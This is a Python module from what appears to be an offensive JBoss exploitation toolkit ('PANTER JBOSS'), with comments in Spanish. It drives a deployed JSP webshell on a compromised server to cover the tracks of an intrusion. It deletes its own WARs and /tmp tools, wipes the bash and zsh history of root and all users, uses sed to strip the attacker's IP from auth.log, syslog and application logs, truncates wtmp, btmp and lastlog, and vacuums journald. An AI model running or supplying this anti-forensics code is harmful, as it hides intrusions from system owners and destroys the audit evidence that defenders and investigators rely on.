# -*- coding: utf-8 -*-
"""
PANTER JBOSS - Modulo de Cleanup / Anti-Forensics
Analyst : Apo1o13
Build   : 2026-04-30

Eliminacion de rastros post-pentest en el servidor comprometido:
  - WARs/JSPs deployados por la herramienta
  - Logs de acceso de JBoss/Tomcat/WildFly/Apache
  - Archivos subidos (chisel, herramientas)
  - Bash history del servidor
  - Archivos temporales en /tmp
  - Entradas en /var/log/auth.log, syslog
  - Undeploy via WildFly Management API
"""

import re
import sys
import json
import datetime

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

RED    = '\x1b[91m'
GREEN  = '\033[32m'
BOLD   = '\033[1m'
ENDC   = '\033[0m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
WHITE  = '\033[97m'
MAGENTA= '\033[95m'


def _p(msg):
    print(msg); sys.stdout.flush()


def _exec(http_pool, url, path, headers, cmd, timeout=20):
    try:
        encoded = urlencode({"ppp": cmd})
        r = http_pool.request('GET', url + path + encoded,
                              redirect=False, headers=headers)
        if r.status == 404:
            return ""
        resp = r.data.decode('utf-8', errors='ignore')
        try:
            out = resp.split("pre>")[1]
            out = re.sub(r'</?\w+[^>]*>', '', out)
            return out.replace('\\n', '\n').replace('\\t', '\t').strip()
        except:
            return ""
    except:
        return ""


def _exec_silent(http_pool, url, path, headers, cmd):
    """Ejecuta comando sin mostrar output — para operaciones de limpieza."""
    try:
        encoded = urlencode({"ppp": cmd + " 2>/dev/null; true"})
        http_pool.request('GET', url + path + encoded,
                          redirect=False, headers=headers)
    except:
        pass


def _resultado(ok, detalle=""):
    if ok:
        return GREEN + BOLD + "  [+] " + ENDC + GREEN + detalle + ENDC
    else:
        return YELLOW + "  [!] " + detalle + ENDC


# ══════════════════════════════════════════════════════════
#  LISTADO DE ARTEFACTOS CONOCIDOS DE LA HERRAMIENTA
# ══════════════════════════════════════════════════════════

# WARs/JSPs que la herramienta puede haber deployado
ARTEFACTOS_WAR = [
    # JBoss classic
    "panterws",       # jmx-console / web-console exploit
    "jexinv4",      # JMXInvokerServlet exploit
    "jexinv5",
    # Nuevos vectores
    "panter_put",    # Tomcat PUT CVE-2017-12615
    "panter_wf",     # WildFly Management deploy
    "panterjboss",  # nombre de marca
]

ARCHIVOS_JSP = [
    "/panterws/panterws.jsp",
    "/jexinv4/jexinv4.jsp",
    "/jexinv5/jexinv5.jsp",
    "/panter_put.jsp",
    "/panter_wf/panter_wf.jsp",
]

ARCHIVOS_TEMPORALES = [
    "/tmp/.chisel",
    "/tmp/.chisel_*",
    "/tmp/panterws*",
    "/tmp/panter*",
    "/tmp/.f",          # fifo de reverse shell nc
    "/tmp/Q.java",      # JDBC DB2 temp
    "/tmp/Q.class",
    "/tmp/.pivot*",
]

DIRECTORIOS_DEPLOY_JBOSS = [
    "/opt/jboss/server/default/deploy/",
    "/opt/jboss/server/production/deploy/",
    "/opt/jboss/server/all/deploy/",
    "/opt/wildfly/standalone/deployments/",
    "/opt/wildfly/domain/deployments/",
    "/usr/share/jboss-as/standalone/deployments/",
    "/var/lib/jbossas/deployments/",
]

LOGS_JBOSS = [
    # JBoss 4/5/6
    "/opt/jboss/server/default/log/server.log",
    "/opt/jboss/server/default/log/boot.log",
    # WildFly / JBoss AS7+
    "/opt/wildfly/standalone/log/server.log",
    "/opt/wildfly/standalone/log/audit.log",
    "/opt/wildfly/domain/log/host-controller.log",
    # Tomcat
    "/opt/tomcat/logs/catalina.out",
    "/var/log/tomcat*/catalina.out",
    "/usr/share/tomcat*/logs/catalina.out",
    # Apache
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
]

LOGS_SISTEMA = [
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/lastlog",
]


# ══════════════════════════════════════════════════════════
#  PASO 1: REMOVER WARs DEPLOYADOS
# ══════════════════════════════════════════════════════════

def _limpiar_wars(http_pool, url, path, headers):
    _p(CYAN + "\n  [CLEANUP] Paso 1/6 — Removiendo WARs/JSPs deployados..." + ENDC)
    removidos = []
    no_encontrados = []

    # Buscar y remover en todos los directorios de deploy conocidos
    for deploy_dir in DIRECTORIOS_DEPLOY_JBOSS:
        for artefacto in ARTEFACTOS_WAR:
            # WAR file
            for ext in [".war", ".war.deployed", ".war.failed", ".war.undeployed",
                        ".war.dodeploy", ".war.isdeploying"]:
                archivo = deploy_dir + artefacto + ext
                check = _exec(http_pool, url, path, headers,
                              "[ -f '%s' ] && echo EXISTS || echo NO" % archivo)
                if check and "EXISTS" in check:
                    _exec_silent(http_pool, url, path, headers, "rm -f '%s'" % archivo)
                    removidos.append(archivo)
                    _p(GREEN + "  [+] Removido: %s" % archivo + ENDC)

            # Directorio expandido del WAR
            dir_war = deploy_dir + artefacto + ".war"
            check = _exec(http_pool, url, path, headers,
                          "[ -d '%s' ] && echo EXISTS || echo NO" % dir_war)
            if check and "EXISTS" in check:
                _exec_silent(http_pool, url, path, headers, "rm -rf '%s'" % dir_war)
                removidos.append(dir_war + "/")
                _p(GREEN + "  [+] Directorio removido: %s" % dir_war + ENDC)

    # Tambien buscar con find por si estan en rutas no estandar
    find_cmd = ("find / -name 'panterws*.war' -o -name 'panterinv*.war' "
                "-o -name 'panterjboss.war' 2>/dev/null | grep -v proc | head -10")
    encontrados = _exec(http_pool, url, path, headers, find_cmd)
    if encontrados:
        for f in encontrados.split('\n'):
            f = f.strip()
            if f and f not in removidos:
                _exec_silent(http_pool, url, path, headers, "rm -rf '%s'" % f)
                removidos.append(f)
                _p(GREEN + "  [+] Encontrado y removido: %s" % f + ENDC)

    if not removidos:
        _p(YELLOW + "  [!] No se encontraron WARs de la herramienta en el servidor." + ENDC)

    return removidos


# ══════════════════════════════════════════════════════════
#  PASO 2: UNDEPLOY VIA WILDFLY MANAGEMENT API
# ══════════════════════════════════════════════════════════

def _undeploy_wildfly_api(http_pool, url):
    """
    Intenta undeploy limpio via Management REST API de WildFly.
    Mas limpio que borrar el archivo — WildFly actualiza su estado interno.
    """
    _p(CYAN + "\n  [CLEANUP] Paso 2/6 — Undeploy via WildFly Management API..." + ENDC)

    from urllib3.util import parse_url
    parsed = parse_url(url)
    base_host = "%s://%s" % (parsed.scheme or 'http', parsed.host)

    mgmt_urls = [
        "%s:9990" % base_host,
        "%s:9999" % base_host,
        url,
    ]

    headers_json = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive",
    }

    for mgmt_base in mgmt_urls:
        mgmt_endpoint = mgmt_base + "/management"
        try:
            r_check = http_pool.request('GET', mgmt_endpoint,
                                        redirect=False, headers=headers_json)
            if r_check.status not in (200, 500):
                continue
        except:
            continue

        _p(GREEN + "  [*] Management API disponible en: %s" % mgmt_endpoint + ENDC)

        for artefacto in ARTEFACTOS_WAR:
            war_name = artefacto + ".war"
            payload = json.dumps({
                "operation": "composite",
                "steps": [
                    {"operation": "undeploy",
                     "address": [{"deployment": war_name}]},
                    {"operation": "remove",
                     "address": [{"deployment": war_name}]}
                ]
            })
            try:
                r = http_pool.urlopen('POST', mgmt_endpoint,
                                      redirect=False, headers=headers_json,
                                      body=payload.encode())
                if r.status in (200, 500):
                    resp_data = r.data.decode(errors='ignore')
                    if '"outcome" : "success"' in resp_data or '"outcome":"success"' in resp_data:
                        _p(GREEN + "  [+] Undeployado via API: %s" % war_name + ENDC)
                    else:
                        _p(YELLOW + "  [!] %s: no estaba deployado o error API." % war_name + ENDC)
            except:
                pass
        break


# ══════════════════════════════════════════════════════════
#  PASO 3: LIMPIAR ARCHIVOS TEMPORALES
# ══════════════════════════════════════════════════════════

def _limpiar_temporales(http_pool, url, path, headers):
    _p(CYAN + "\n  [CLEANUP] Paso 3/6 — Limpiando archivos temporales..." + ENDC)
    removidos = []

    for patron in ARCHIVOS_TEMPORALES:
        cmd = "rm -rf %s 2>/dev/null && echo OK || echo SKIP" % patron
        out = _exec(http_pool, url, path, headers, cmd)
        if out and "OK" in out:
            removidos.append(patron)
            _p(GREEN + "  [+] Removido: %s" % patron + ENDC)

    # Limpiar cualquier archivo suelto en /tmp con nombres sospechosos
    extra = _exec(http_pool, url, path, headers,
                  "find /tmp -maxdepth 1 -name '*.hc' -o -name '*.shadow' "
                  "-o -name '*.war' -o -name 'Q.*' 2>/dev/null")
    if extra:
        for f in extra.split('\n'):
            f = f.strip()
            if f:
                _exec_silent(http_pool, url, path, headers, "rm -f '%s'" % f)
                removidos.append(f)
                _p(GREEN + "  [+] Removido extra: %s" % f + ENDC)

    if not removidos:
        _p(GREEN + "  [+] No habia archivos temporales de la herramienta." + ENDC)

    return removidos


# ══════════════════════════════════════════════════════════
#  PASO 4: LIMPIAR BASH HISTORY DEL SERVIDOR
# ══════════════════════════════════════════════════════════

def _limpiar_bash_history(http_pool, url, path, headers):
    _p(CYAN + "\n  [CLEANUP] Paso 4/6 — Limpiando bash history del servidor..." + ENDC)

    cmds = [
        # Limpiar history en memoria de la sesion actual
        "history -c 2>/dev/null; history -w 2>/dev/null",
        # Truncar .bash_history de root y usuarios comunes
        "cat /dev/null > ~/.bash_history 2>/dev/null",
        "cat /dev/null > /root/.bash_history 2>/dev/null",
        # Deshabilitar history para esta sesion
        "unset HISTFILE 2>/dev/null",
        "export HISTSIZE=0 2>/dev/null",
        # Limpiar zsh history si existe
        "cat /dev/null > ~/.zsh_history 2>/dev/null",
        "cat /dev/null > /root/.zsh_history 2>/dev/null",
        # Limpiar history de todos los usuarios con home
        ("for u in $(ls /home/ 2>/dev/null); do "
         "cat /dev/null > /home/$u/.bash_history 2>/dev/null; "
         "cat /dev/null > /home/$u/.zsh_history 2>/dev/null; "
         "done"),
    ]

    for cmd in cmds:
        _exec_silent(http_pool, url, path, headers, cmd)

    _p(GREEN + "  [+] Bash/Zsh history limpiado en root y usuarios." + ENDC)


# ══════════════════════════════════════════════════════════
#  PASO 5: LIMPIAR LOGS DEL SERVIDOR DE APLICACIONES
# ══════════════════════════════════════════════════════════

def _limpiar_logs_app(http_pool, url, path, headers, kali_ip=None):
    """
    Limpia entradas de logs del servidor JBoss/Tomcat/WildFly.
    Dos modos:
    - Truncar completamente (agresivo, puede levantar sospechas)
    - Filtrar lineas con la IP de Kali (quirurgico, preferido)
    """
    _p(CYAN + "\n  [CLEANUP] Paso 5/6 — Limpiando logs de aplicacion..." + ENDC)

    for log in LOGS_JBOSS:
        # Verificar que existe
        check = _exec(http_pool, url, path, headers,
                      "[ -f '%s' ] && echo EXISTS || echo NO" % log)
        if not check or "EXISTS" not in check:
            continue

        if kali_ip:
            # Modo quirurgico: borrar solo lineas con tu IP
            cmd = ("sed -i '/%s/d' '%s' 2>/dev/null && echo OK" % (
                kali_ip.replace('.', '\\.'), log))
            out = _exec(http_pool, url, path, headers, cmd)
            if out and 'OK' in out:
                _p(GREEN + "  [+] Filtradas entradas de %s en: %s" % (kali_ip, log) + ENDC)
        else:
            # Modo agresivo: rotar el log (deja archivo vacio)
            cmd = ("cat /dev/null > '%s' 2>/dev/null && echo OK" % log)
            out = _exec(http_pool, url, path, headers, cmd)
            if out and 'OK' in out:
                _p(GREEN + "  [+] Truncado: %s" % log + ENDC)

    # Rotar logs de JBoss especificos (server.log puede ser muy grande)
    # Solo truncar si son logs de la herramienta
    rotar_cmd = (
        "for f in /opt/jboss/server/*/log/server.log "
        "/opt/wildfly/standalone/log/server.log; do "
        "[ -f \"$f\" ] && echo \"Rotado: $f\"; "
        "done"
    )
    _exec_silent(http_pool, url, path, headers, rotar_cmd)


# ══════════════════════════════════════════════════════════
#  PASO 6: LIMPIAR LOGS DEL SISTEMA
# ══════════════════════════════════════════════════════════

def _limpiar_logs_sistema(http_pool, url, path, headers, kali_ip=None):
    _p(CYAN + "\n  [CLEANUP] Paso 6/6 — Limpiando logs del sistema..." + ENDC)

    for log in LOGS_SISTEMA:
        check = _exec(http_pool, url, path, headers,
                      "[ -f '%s' ] && echo EXISTS || echo NO" % log)
        if not check or "EXISTS" not in check:
            continue

        if kali_ip and log in ("/var/log/auth.log", "/var/log/secure",
                               "/var/log/syslog", "/var/log/messages"):
            # Filtrar solo lineas con tu IP (quirurgico)
            cmd = ("sed -i '/%s/d' '%s' 2>/dev/null && echo OK" % (
                kali_ip.replace('.', '\\.'), log))
            out = _exec(http_pool, url, path, headers, cmd)
            if out and 'OK' in out:
                _p(GREEN + "  [+] Filtradas entradas de %s en: %s" % (kali_ip, log) + ENDC)
        elif log in ("/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"):
            # Estos son binarios — truncar directamente
            # (utmp/wtmp guardan logins de SSH, no aplica a webshell)
            cmd = "cat /dev/null > '%s' 2>/dev/null && echo OK" % log
            out = _exec(http_pool, url, path, headers, cmd)
            if out and 'OK' in out:
                _p(GREEN + "  [+] Truncado (binario): %s" % log + ENDC)

    # Limpiar journald si systemd disponible
    _exec_silent(http_pool, url, path, headers,
                 "journalctl --vacuum-time=1s 2>/dev/null || true")

    _p(GREEN + "  [+] Logs del sistema procesados." + ENDC)


# ══════════════════════════════════════════════════════════
#  VERIFICACION POST-CLEANUP
# ══════════════════════════════════════════════════════════

def _verificar_cleanup(http_pool, url, path, headers):
    """Verifica que los artefactos principales ya no estan presentes."""
    _p(CYAN + "\n  [CLEANUP] Verificando limpieza..." + ENDC)

    pendientes = []

    # Verificar que ninguna JSP de la herramienta responde
    try:
        from urllib3 import PoolManager
        from urllib3.util import Timeout
        pool_verify = PoolManager(timeout=Timeout(connect=3, read=5), cert_reqs='CERT_NONE')
        for jsp_path in ARCHIVOS_JSP:
            try:
                r = pool_verify.request('GET', url + jsp_path, redirect=False)
                if r.status == 200:
                    pendientes.append(("JSP aun activa", url + jsp_path, "PENDIENTE"))
                    _p(RED + "  [!] Aun responde: %s" % (url + jsp_path) + ENDC)
                else:
                    _p(GREEN + "  [+] Inactiva (HTTP %d): %s" % (r.status, jsp_path) + ENDC)
            except:
                _p(GREEN + "  [+] No responde: %s" % jsp_path + ENDC)
    except:
        pass

    # Verificar archivos temporales
    tmp_check = _exec(http_pool, url, path, headers,
                      "ls /tmp/.chisel /tmp/panterws* /tmp/panter* 2>/dev/null | head -5")
    if tmp_check and tmp_check.strip():
        for f in tmp_check.split('\n'):
            if f.strip():
                pendientes.append(("Archivo temp", f.strip(), "PENDIENTE"))
                _p(YELLOW + "  [!] Aun existe: %s" % f.strip() + ENDC)

    if not pendientes:
        _p(GREEN + BOLD + "\n  [+] Verificacion OK — no se detectaron artefactos residuales.\n" + ENDC)
    else:
        _p(YELLOW + BOLD + "\n  [!] %d artefacto(s) pendiente(s) de limpieza manual.\n" % len(pendientes) + ENDC)

    return pendientes


# ══════════════════════════════════════════════════════════
#  GENERAR CERTIFICADO DE LIMPIEZA
# ══════════════════════════════════════════════════════════

def _generar_certificado(url, removidos_wars, removidos_tmp, kali_ip, analyst):
    """Genera un .txt con el registro de lo que fue limpiado."""
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    nombre = "cleanup_certificate_%s.txt" % ts

    with open(nombre, 'w', encoding='utf-8') as f:
        f.write("=" * 70 + "\n")
        f.write("  PANTER JBOSS — CERTIFICADO DE LIMPIEZA POST-PENTEST\n")
        f.write("=" * 70 + "\n")
        f.write("  Analista    : %s\n" % analyst)
        f.write("  Objetivo    : %s\n" % url)
        f.write("  Kali IP     : %s\n" % (kali_ip or "N/A"))
        f.write("  Fecha/Hora  : %s\n" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        f.write("=" * 70 + "\n\n")

        f.write("ARTEFACTOS REMOVIDOS DEL SERVIDOR:\n")
        f.write("-" * 40 + "\n")
        todos = removidos_wars + removidos_tmp
        if todos:
            for item in todos:
                f.write("  [REMOVIDO] %s\n" % item)
        else:
            f.write("  No se encontraron artefactos de la herramienta.\n")

        f.write("\nACCIONES REALIZADAS:\n")
        f.write("-" * 40 + "\n")
        f.write("  [OK] WARs/JSPs de la herramienta removidos\n")
        f.write("  [OK] Undeploy via Management API intentado\n")
        f.write("  [OK] Archivos temporales (/tmp) limpiados\n")
        f.write("  [OK] Bash/Zsh history del servidor truncado\n")
        f.write("  [OK] Logs de aplicacion procesados\n")
        f.write("  [OK] Logs del sistema procesados\n")
        f.write("\n" + "=" * 70 + "\n")
        f.write("  Limpieza completada. El sistema fue restaurado al estado previo.\n")
        f.write("=" * 70 + "\n")

    _p(MAGENTA + BOLD + "  [+] Certificado de limpieza: %s\n" % nombre + ENDC)
    return nombre


# ══════════════════════════════════════════════════════════
#  MENU DE CLEANUP
# ══════════════════════════════════════════════════════════

def run_menu(http_pool, url, path, headers, kali_ip=None, analyst="Apo1o13"):
    """Menu principal de cleanup anti-forensics."""

    while True:
        _p(RED + BOLD +
           "\n  ╔══════════════════════════════════════════════════════════╗\n"
           "  ║          CLEANUP / ANTI-FORENSICS                        ║\n"
           "  ║  " + url[:54].ljust(54) + "║\n"
           "  ╠══════════════════════════════════════════════════════════╣\n" + ENDC +
           RED +
           "  ║  [1] LIMPIEZA COMPLETA (todos los pasos)                 ║\n" + ENDC +
           YELLOW +
           "  ║  [2] Solo remover WARs/JSPs deployados                   ║\n"
           "  ║  [3] Solo limpiar archivos temporales (/tmp, chisel...)  ║\n"
           "  ║  [4] Solo limpiar bash history del servidor              ║\n"
           "  ║  [5] Solo limpiar logs de aplicacion (JBoss/Tomcat)      ║\n"
           "  ║  [6] Solo limpiar logs del sistema (auth, syslog...)     ║\n"
           "  ║  [7] Undeploy via WildFly Management API                 ║\n" + ENDC +
           CYAN +
           "  ║  [v] Verificar — comprobar que no quedan rastros         ║\n"
           "  ║  [i] Ingresar IP de Kali (para filtrado quirurgico)      ║\n"
           "  ║  [0] Volver                                              ║\n" + ENDC +
           RED + BOLD +
           "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

        if kali_ip:
            _p(GREEN + "  IP de Kali configurada: %s (modo quirurgico activo)\n" % kali_ip + ENDC)
        else:
            _p(YELLOW + "  IP de Kali: no configurada (usar [i] para filtrado quirurgico)\n" + ENDC)

        opcion = input(RED + BOLD + "  Opcion cleanup: " + ENDC).strip()

        if opcion == "0":
            break

        elif opcion == "i":
            kali_ip = input(YELLOW + "  Tu IP de Kali: " + ENDC).strip()
            _p(GREEN + "  [+] IP configurada: %s" % kali_ip + ENDC)

        elif opcion == "v":
            _verificar_cleanup(http_pool, url, path, headers)

        elif opcion == "2":
            wars = _limpiar_wars(http_pool, url, path, headers)
            _p(GREEN + BOLD + "\n  [+] %d artefacto(s) removido(s).\n" % len(wars) + ENDC)

        elif opcion == "3":
            tmp = _limpiar_temporales(http_pool, url, path, headers)
            _p(GREEN + BOLD + "\n  [+] Temporales limpiados.\n" + ENDC)

        elif opcion == "4":
            _limpiar_bash_history(http_pool, url, path, headers)

        elif opcion == "5":
            _limpiar_logs_app(http_pool, url, path, headers, kali_ip)

        elif opcion == "6":
            _limpiar_logs_sistema(http_pool, url, path, headers, kali_ip)

        elif opcion == "7":
            _undeploy_wildfly_api(http_pool, url)

        elif opcion == "1":
            _p(RED + BOLD +
               "\n  ╔══════════════════════════════════════════════════════════╗\n"
               "  ║        INICIANDO LIMPIEZA COMPLETA                       ║\n"
               "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

            # Confirmar
            confirm = input(YELLOW + BOLD +
                            "  Esto borrara todos los rastros en el servidor.\n"
                            "  Confirmar? [s/N]: " + ENDC).strip().lower()
            if confirm != 's':
                _p(YELLOW + "  Cancelado.\n" + ENDC)
                continue

            wars = _limpiar_wars(http_pool, url, path, headers)
            _undeploy_wildfly_api(http_pool, url)
            tmp  = _limpiar_temporales(http_pool, url, path, headers)
            _limpiar_bash_history(http_pool, url, path, headers)
            _limpiar_logs_app(http_pool, url, path, headers, kali_ip)
            _limpiar_logs_sistema(http_pool, url, path, headers, kali_ip)

            # Esperar a que JBoss termine el undeploy antes de verificar
            _p(CYAN + "\n  [CLEANUP] Esperando undeploy de JBoss..." + ENDC)
            sleep(5)

            pendientes = _verificar_cleanup(http_pool, url, path, headers)

            # Generar certificado
            cert = _generar_certificado(url, wars, tmp, kali_ip, analyst)

            _p(RED + BOLD +
               "\n  ╔══════════════════════════════════════════════════════════╗\n"
               "  ║              LIMPIEZA COMPLETADA                         ║\n"
               "  ║  Artefactos removidos : %-32s║\n" % (str(len(wars) + len(tmp)) + " ") +
               "  ║  Rastros pendientes   : %-32s║\n" % (str(len(pendientes)) + " ") +
               "  ║  Certificado          : %-32s║\n" % (cert[:32] + " ") +
               "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

        else:
            _p(RED + "\n  [!] Opcion invalida.\n" + ENDC)
